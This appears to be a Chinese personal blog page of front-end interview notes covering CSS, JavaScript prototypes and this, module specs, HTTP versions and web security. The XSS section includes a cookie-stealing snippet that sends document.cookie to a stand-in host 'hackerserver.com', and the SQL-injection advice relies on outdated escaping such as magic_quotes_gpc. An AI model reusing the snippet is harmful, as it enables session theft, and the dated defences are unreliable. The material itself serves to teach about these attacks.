<!DOCTYPE html>
<html>

  <head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>fe - Just for recording</title>

	<link rel="shortcut icon" href="/static/images/favicon.jpg">
	<link rel="icon" href="/static/images/favicon.jpg">

	<link rel="stylesheet" href="/static/css/bootstrap.min.css">
	<link rel="stylesheet" href="/static/css/common.css">

	<link rel="canonical" href="/2017/08/18/fe/">
	<link rel="alternate" type="application/rss+xml" title="Just for recording" href="/feed.xml">

	<meta name="keywords" content="fe, Just for recording, personal blog;">
	<meta name="description" content="personal blog;">

	<script src="/static/js/jquery.min.js"></script>
	<!--[if lt IE 9]>
    	<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
  	<![endif]-->
  	<script>
		var _hmt = _hmt || [];
		(function() {
		  var hm = document.createElement("script");
		  hm.src = "//hm.baidu.com/hm.js?ff1da0dd6c6a814ef6ec49dd10246092";
		  var s = document.getElementsByTagName("script")[0];
		  s.parentNode.insertBefore(hm, s);
		})();
	</script>
</head>


  <body class="index">

    <header class="navbar navbar-inverse navbar-fixed-top docs-nav" role="banner">
  <div class="container">
    <div class="navbar-header">
      <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".bs-navbar-collapse">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a href="/" class="navbar-brand">
        <span>CC-2018</span>
      </a>
    </div>
    <nav class="collapse navbar-collapse bs-navbar-collapse" role="navigation">
      <ul class="nav navbar-nav navbar-right">
        <li>
          <a href="/">Home</a>
        </li>
        <li>
          <a href="/categories/">Categories</a>
        </li>
        <li>
          <a href="/tag">Tag</a>
        </li>
      </ul>
    </nav>
  </div>
</header>

    <div class="docs-header" id="content">
  <div class="container">
      <div class="desc">
          
        		<!--
      		    <h1>fe</h1>
      		    <p>Post on Aug 18, 2017 by <a href="/about">CC-2018</a></p>
      		-->
      		    <h1>Some words wanna say</h1>
          
      </div>
  </div>
</div>

    
      
<div class="docs-banner">
  <div class="container">
      <div class="row">
          
          	<a href="/categories/#document-ref">document</a>	/
          	<a href="/tag/#总结-ref">总结</a>
          
      </div>

  </div>
</div>

    

    <div class="docs-container container">
  <div class="row">
    <div class="col-md-3">
      <div class="sidebar hidden-print" role="complementary">
        <div id="navigation">
  <h2>目录</h2>
  <ul class="nav sidenav">
<!--
    
      
      
      
      

      
        <li><a href="#year_2017">2017</a>
          <ul class="nav">
            <li><a href="#month_2017_August">August</a></li>
      

      
        
          
        
      
    
      
      
      
      

      

      
        
          
        
      
    
      
      
      
      

      

      
        
          
              <li><a href="#month_2017_July">July</a></li>
          
        
      
    
      
      
      
      

      

      
        
          
        
      
    
      
      
      
      

      

      
        
          
              <li><a href="#month_2017_June">June</a></li>
          
        
      
    
      
      
      
      

      

      
        
          
        
      
    
      
      
      
      

      

      
        
          
        
      
    
      
      
      
      

      

      
        
          
        
      
    
      
      
      
      

      

      
        
          
        
      
    
      
      
      
      

      

      
        
          
        
      
    
      
      
      
      

      

      
        
          
        
      
    
      
      
      
      

      

      
            </ul>
          </li>
      
    
-->
  </ul>
</div>

      </div>
    </div>
    <div class="col-md-9" role="main">
      <div class="panel docs-content">
        <div class="wrapper">
            <header class="post-header">
              <h1 class="post-title">fe</h1>
              <!--
                <p class="post-meta">Aug 18, 2017 • CC-2018</p>
              -->
              <div class="meta">Posted on <span class="postdate">Aug 18, 2017</span> By <a target="_blank" href="http://localhost:4000">CC-2018</a></div>
              <br />
            </header>
            <article class="post-content">
              <ul id="markdown-toc">
  <li><a href="#css盒子模型" id="markdown-toc-css盒子模型">css盒子模型</a></li>
  <li><a href="#css未知宽高元素水平垂直居中" id="markdown-toc-css未知宽高元素水平垂直居中">CSS未知宽高元素水平垂直居中</a></li>
  <li><a href="#绑定事件的方式" id="markdown-toc-绑定事件的方式">绑定事件的方式</a></li>
  <li><a href="#类原型对象构造函数" id="markdown-toc-类原型对象构造函数">类、原型对象、构造函数</a></li>
  <li><a href="#this-指针" id="markdown-toc-this-指针">this 指针</a></li>
  <li><a href="#cmd-amd-es6-模块规范" id="markdown-toc-cmd-amd-es6-模块规范">cmd amd es6 模块规范</a></li>
  <li><a href="#http-http1x-https-http20-websocket" id="markdown-toc-http-http1x-https-http20-websocket">http http1.x https http2.0 websocket</a></li>
  <li><a href="#web安全" id="markdown-toc-web安全">web安全</a></li>
</ul>

<h3 id="css盒子模型">css盒子模型</h3>

<p>盒子模型包括外边距（margin）、边框（border）、内边距（padding）、内容（content）四个属性。</p>

<p>content为image，或文字，或包含小的盒子。</p>

<p>CSS盒子具有弹性，会自适应。</p>

<p>W3C标准盒子 = (边框 + 填充 + 内容块大小)。</p>

<p>box-sizing:border-box  width属性为边框 + 填充 + 内容块大小</p>

<p>box-sizing:content-box  width属性为内容块大小</p>

<p>inline元素声明margin-top和margin-bottom没有效果</p>

<h3 id="css未知宽高元素水平垂直居中">CSS未知宽高元素水平垂直居中</h3>

<p><strong>方法一</strong></p>

<p>思路：显示设置父元素为：table，子元素为：cell-table，这样就可以使用vertical-align: center，实现水平居中</p>

<p>优点：父元素（parent）可以动态的改变高度（table元素的特性）</p>

<p>缺点：IE8以下不支持，增加html复杂性</p>

<p><strong>方法二</strong></p>

<p>思路：子元素绝对定位，距离顶部 50%，左边50%，然后使用css3 transform:translate(-50%; -50%)</p>

<p>优点：高大上,可以在webkit内核的浏览器中使用</p>

<p>缺点：不支持IE9以下不支持transform属性</p>

<p><strong>方法三</strong>
思路：使用css3 flex布局
优点：简单 快捷
缺点：兼容不好</p>

<h3 id="绑定事件的方式">绑定事件的方式</h3>

<p>在DOM元素中直接绑定</p>

<p>在JavaScript代码中绑定 onclick=function 方式</p>

<p>绑定事件监听函数 用addEventListener() 或 attachEvent() 来绑定事件监听函数。</p>

<h3 id="类原型对象构造函数">类、原型对象、构造函数</h3>

<p>面向对象，js中不存在类的概念，js不是基于类，而是通过构造函数(constructor)和原型链（propotype chains）实现的</p>

<p>构造函数的特点：</p>

<p>构造函数的首字母必须大写，用来区分于普通函数</p>

<p>内部使用的this对象，来指向即将要生成的实例对象</p>

<p>使用New来生成实例对象</p>

<p>构造函数的缺点：</p>

<p>所有的实例对象都可以继承构造器函数中的属性和方法(包括构造函数里的prototype)。但是，同一个对象实例之间，无法共享属性，所以对于方法来说，如果定义在构造函数里会造成多个实例创建多个方法，浪费内存空间</p>

<p>解决思路：</p>

<p>所有实例都会通过原型链引用到prototype</p>

<p>prototype相当于特定类型所有实例都可以访问到的一个公共容器</p>

<p>那么我们就将重复的东西放到公共容易就好了</p>

<p>propotype属性的作用</p>

<p>js中每个数据类型都是对象，除了null 和 undefined（这个可以参考另一篇将null 和 undefined的博客）,而每个对象都是继承自一个原型对象，只有null除外，它没有自己的原型对象，最终的Objec的原型为null</p>

<p>JS中万物都是对象，但是对象也分为：普通对象和函数对象，也就是Object 和 Function.</p>

<p>那么怎么区分普通对象和函数对象呢？ —凡是通过New Function()创建的对象都是函数对象，其他的都是普通对象.</p>

<p>需要注意的是：普通对象没有propotype（prototype即是属性也是对象），但是有__proto__属性。</p>

<p><strong>js创建对象的时候都有一个__propo__内置属性，用于指向创建它的函数对象的原型对象prototype。</strong></p>

<h3 id="this-指针">this 指针</h3>

<p>它代表函数运行时，自动生成的一个内部对象，只能在函数内部使用。</p>

<p>一个总的原则，那就是this指的是，调用函数的那个对象。</p>

<ol>
  <li>
    <p>全局函数调用，指向window或global</p>
  </li>
  <li>
    <p>对象方法调用，指向上级对象。</p>
  </li>
  <li>
    <p>作为构造函数调用，指向这个对象</p>
  </li>
  <li>
    <p>apply调用 它的作用是改变函数的调用对象，它的第一个参数就表示改变后的调用这个函数的对象。因此，this指的就是这第一个参数。</p>
  </li>
  <li>
    <p>箭头函数this</p>
  </li>
</ol>

<h3 id="cmd-amd-es6-模块规范">cmd amd es6 模块规范</h3>

<p><strong>CommonJS 规范</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>// 一下为一个完整模块定义
{
  id: '...',
  exports: { ... },
  loaded: true,
  ...
}

// math.js
exports.add = function(a, b) {
  return a + b;
}

var math = require('math');
math.add(2, 3); // 5
</code></pre>
</div>

<p>cmd规范里require是一个同步读取本地磁盘js过程，不适合浏览器的下载</p>

<p><strong>AMD 规范</strong></p>

<p>AMD是”Asynchronous Module Definition”的缩写，即”异步模块定义”。调用格式为：<code class="highlighter-rouge">require([module], callback);</code></p>

<p>模块书写必须使用特定的define()函数来定义 <code class="highlighter-rouge">define(id?, dependencies?, factory);</code> AMD是依赖前置的。</p>

<p><strong>CMD 规范</strong></p>

<p>CMD推崇依赖就近，延迟执行。可以把依赖写进代码的任意一行。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>define(function(require, exports, module) {
  var a = require('./a');
  a.doSomething();
  var b = require('./b');
  b.doSomething();
})
</code></pre>
</div>
<p><strong>ES6</strong></p>

<p>es6通过import、export实现模块的输入输出。其中import命令用于输入其他模块提供的功能，export命令用于规定模块的对外接口。</p>

<h3 id="http-http1x-https-http20-websocket">http http1.x https http2.0 websocket</h3>

<p><strong>http</strong></p>

<p>HTTP是建立在TCP协议之上，所以HTTP协议的瓶颈及其优化技巧都是基于TCP协议本身的特性，例如tcp建立连接的3次握手和断开连接的4次挥手以及每次建立连接带来的RTT延迟时间。</p>

<p>带宽：如果说我们还停留在拨号上网的阶段，带宽可能会成为一个比较严重影响请求的问题，但是现在网络基础建设已经使得带宽得到极大的提升，我们不再会担心由带宽而影响网速，那么就只剩下延迟了。</p>

<p>延迟：浏览器阻塞（HOL blocking）：浏览器会因为一些原因阻塞请求。浏览器对于同一个域名，同时只能有 4 个连接（这个根据浏览器内核不同可能会有所差异），超过浏览器最大连接数限制，后续请求就会被阻塞。</p>

<p>DNS 查询（DNS Lookup）：浏览器需要知道目标服务器的 IP 才能建立连接。将域名解析为 IP 的这个系统就是 DNS。这个通常可以利用DNS缓存结果来达到减少这个时间的目的。
 建立连接（Initial connection）：HTTP 是基于 TCP 协议的，浏览器最快也要在第三次握手时才能捎带 HTTP 请求报文，达到真正的建立连接，但是这些连接无法复用会导致每次请求都经历三次握手和慢启动。三次握手在高延迟的场景下影响较明显，慢启动则对文件类大请求影响较大。</p>

<p><strong>HTTP1.0和HTTP1.1的一些区别：</strong></p>

<p>缓存处理，在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。</p>

<p>带宽优化及网络连接的使用，HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</p>

<p>错误通知的管理，在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>

<p>Host头处理，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。</p>

<p>长连接，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。</p>

<p><strong>https</strong></p>

<p>http = tcp + http协议
https = http + ssl</p>

<p><strong>HTTP2.0的新特性</strong></p>

<p>新的二进制格式（Binary Format），HTTP1.x的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑HTTP2.0的协议解析决定采用二进制格式，实现方便且健壮。</p>

<p>多路复用（MultiPlexing），即连接共享，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再归属到各自不同的服务端请求里面。</p>

<p><strong>websocket</strong></p>

<p>WebSocket是基于HTTP1.1的协议，可以简单理解为创建了一条TCP连接，具有双向传输二进制等特性。而HTTP2.0则是对HTML、CSS等JS资源的传输方式进行了优化，并没有提供新的JS API，也不能用于实时传输消息。</p>

<h3 id="web安全">web安全</h3>

<p><strong>DoS和DDoS攻击</strong></p>

<p>伪造大量不存在的ip发送请求给服务器，服务器三步握手时收不到回应会有个长时间的半连接状态，消耗大量资源。</p>

<p><strong>CSRF攻击</strong></p>

<p>b网站利用已登录a网站的cookie，发送恶意请求道a网站</p>

<p>Anti-CSRF-Token防御 即发送请求时在HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域cookie中这个token值，会进行校验该请求当中的token和cookie当中的token值是否都存在且相等，才认为这是合法的请求</p>

<p><strong>XSS攻击</strong></p>

<p>跨站脚本攻击，XSS跨站脚本攻击本身对Web服务器没有直接的危害，它借助网站进行传播，使网站上大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web中打开该URL的时候，恶意脚本会在受害者的计算机上悄悄执行。</p>

<p>如下制造出一个链接：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>vari=document.createElement("img");
document.body.appendChild(i);
i.src = "http://www.hackerserver.com/?c=" + document.cookie;
</code></pre>
</div>
<p>防范措施</p>

<p>输入过滤，在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。相应的JavaScript的编码方式可以使用JavascriptEncode。</p>

<p>HttpOnly Cookie</p>

<p><strong>SQL注入攻击</strong></p>

<p>SQL注入常见的注入方式有：
(1) 内联SQL注入。向查询注入一些SQL代码后，原来的查询仍然会全部执行。内联SQL注入包含字符串内联SQL注入和数字内联SQL注入。
(2) 终止式SQL注入。攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句。</p>

<p>对于SQL注入攻击，我们可以做如下防范：
(1) 防止系统敏感信息泄露。设置php.ini选项display_errors=off，防止php脚本出错之后，在web页面输出敏感信息错误，让攻击者有机可乘。
(2) 数据转义。设置php.ini选项magic_quotes_gpc=on，它会将提交的变量中所有的’(单引号)，”(双引号)，(反斜杠)，空白字符等都在前面自动加上\。或者采用mysql_real_escape()函数或addslashes()函数进行输入参数的转义。
(3) 增加黑名单或者白名单验证。白名单验证一般指，检查用户输入是否是符合预期的类型、长度、数值范围或者其他格式标准。黑名单验证是指，若在用户输入中，包含明显的恶意内容则拒绝该条用户请求。在使用白名单验证时，一般会配合黑名单验证。</p>

            </article>
        </div>
      </div>
      <!-- <div class="panel docs-content">
        <article class="post-content">
          <div class="wrapper">
            <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
          </div>
        </article>
      </div> -->
    </div>
  </div>
</div>

    
    <footer class="footer" role="contentinfo">
	<div class="container">
		<p class="copyright">Copyright &copy; 2016-2017 CC-2018.</p>
	</div>
</footer>

<script src="/static/js/jquery.min.js"></script>
<script src="/static/js/bootstrap.min.js"></script>
<script src="/static/js/holder.min.js"></script>
<script src="/static/js/lessismore.js"></script>
<script src="/static/js/application.js"></script>


  </body>
</html>
